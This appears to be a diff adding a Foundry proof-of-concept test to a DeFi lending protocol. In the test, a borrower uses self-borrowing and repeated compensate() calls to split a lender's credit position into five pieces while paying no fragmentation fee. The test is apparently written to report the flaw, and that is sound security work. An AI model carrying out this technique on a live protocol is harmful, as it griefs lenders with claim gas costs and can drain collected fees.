@@ -987,4 +987,85 @@ contract CompensateTest is BaseTest {
             assertLt(afterBalance, beforeBalance);
         }
     }
+
+    function test_Compensate_borrower_forces_splitting_lender_single_credit_position_into_multiple_credit_positions()
+        public
+    {
+        _setPrice(1e18);
+        _updateConfig("swapFeeAPR", 0); // No swap fee for simplicity
+
+        // 5 USDC for the fragmentation fee
+        assertEq(size.feeConfig().fragmentationFee, 5e6);
+
+        assertEq(_state().feeRecipient.borrowATokenBalance, 0);
+        assertEq(_state().feeRecipient.collateralTokenBalance, 0);
+
+        _deposit(alice, usdc, 100e6);
+        _deposit(bob, weth, 200e18);
+
+        // No lending yield for simplicity
+        _buyCreditLimit(alice, block.timestamp + 365 days, YieldCurveHelper.pointCurve(365 days, 0));
+
+        // Bob borrows Alice's 100 USDC (w/o interest for simplicity)
+        uint256 debtPositionId_bob = _sellCreditMarket(bob, alice, RESERVED_ID, 100e6, 365 days, false);
+        uint256 creditPositionId_alice = size.getCreditPositionIdsByDebtPositionId(debtPositionId_bob)[0];
+
+        // Bob maliciously splits Alice's lending liquidity (USDC) in a single source credit position into other 4 credit positions (20 USDC for each)
+        // and leaves the leftover 20 USDC in the source position
+        Vars memory _before = _state();
+
+        uint256[4] memory creditPositionId_alice_splits;
+        for (uint256 i = 0; i < 4; i++) {
+            // Self-borrowing, no lending yield
+            _buyCreditLimit(bob, block.timestamp + 365 days, YieldCurveHelper.pointCurve(365 days, 0));
+            uint256 debtPositionId_self_borrow_bob = _sellCreditMarket(bob, bob, RESERVED_ID, 20e6, 365 days, false);
+            uint256 creditPositionToCompensateId_bob =
+                size.getCreditPositionIdsByDebtPositionId(debtPositionId_self_borrow_bob)[0];
+
+            // Split Alice's source credit position
+            _compensate(bob, creditPositionId_alice, creditPositionToCompensateId_bob, 20e6);
+            creditPositionId_alice_splits[i] = creditPositionToCompensateId_bob;
+        }
+
+        Vars memory _after = _state();
+
+        // Bob neither paid fragmentation fees in borrowToken (USDC) nor collateralToken (WETH)
+        assertEq(_before.bob.borrowATokenBalance, _after.bob.borrowATokenBalance);
+        assertEq(_before.bob.collateralTokenBalance, _after.bob.collateralTokenBalance);
+
+        assertEq(_state().feeRecipient.borrowATokenBalance, 0);
+        assertEq(_state().feeRecipient.collateralTokenBalance, 0);
+
+        // Bob repays the source debt position's leftover (20 USDC) and all split debt positions (80 USDC in total)
+        _repay(bob, size.getCreditPosition(creditPositionId_alice).debtPositionId, bob);
+        for (uint256 i = 0; i < 4; i++) {
+            _repay(bob, size.getCreditPosition(creditPositionId_alice_splits[i]).debtPositionId, bob);
+        }
+
+        // Alice's lending liquidity (USDC) in a single credit position was maliciously split into 5 credit positions
+        assertEq(size.getCreditPosition(creditPositionId_alice).credit, 20e6);
+        assertEq(size.getCreditPosition(creditPositionId_alice_splits[0]).credit, 20e6);
+        assertEq(size.getCreditPosition(creditPositionId_alice_splits[1]).credit, 20e6);
+        assertEq(size.getCreditPosition(creditPositionId_alice_splits[2]).credit, 20e6);
+        assertEq(size.getCreditPosition(creditPositionId_alice_splits[3]).credit, 20e6);
+
+        // Alice (or the protocol's keeper bots) must execute the claim() 5 times to aggregate her lending liquidity (USDC) back
+        // -- (Scenario 1) If the protocol's keeper bots execute the claim() on behalf of Alice, this attack can drain the protocol's collected fragmentation fees
+        // -- (Scenario 2) If Alice executes the claim() by herself, she will be grieved by a significant amount of claiming gas fees, and she will finally eat the loss
+        _claim(alice, creditPositionId_alice);
+        _claim(alice, creditPositionId_alice_splits[0]);
+        _claim(alice, creditPositionId_alice_splits[1]);
+        _claim(alice, creditPositionId_alice_splits[2]);
+        _claim(alice, creditPositionId_alice_splits[3]);
+        assertEq(_state().alice.borrowATokenBalance, 100e6); // No yield collected from Bob for simplicity
+        assertEq(_state().alice.collateralTokenBalance, 0); // Further assertion
+
+        // Again, Bob neither paid fragmentation fees in borrowToken (USDC) nor collateralToken (WETH)
+        assertEq(_state().bob.borrowATokenBalance, 0); // No yield collected from self-borrowing
+        assertEq(_state().bob.collateralTokenBalance, 200e18);
+
+        assertEq(size.feeConfig().fragmentationFee, 5e6); // 5 USDC was set for the fragmentation fee
+        assertEq(_state().feeRecipient.borrowATokenBalance, 0); // No collecting fragmentation fees in borrowToken (USDC)
+        assertEq(_state().feeRecipient.collateralTokenBalance, 0); // No collecting fragmentation fees in collateralToken (WETH)
+    }
 }
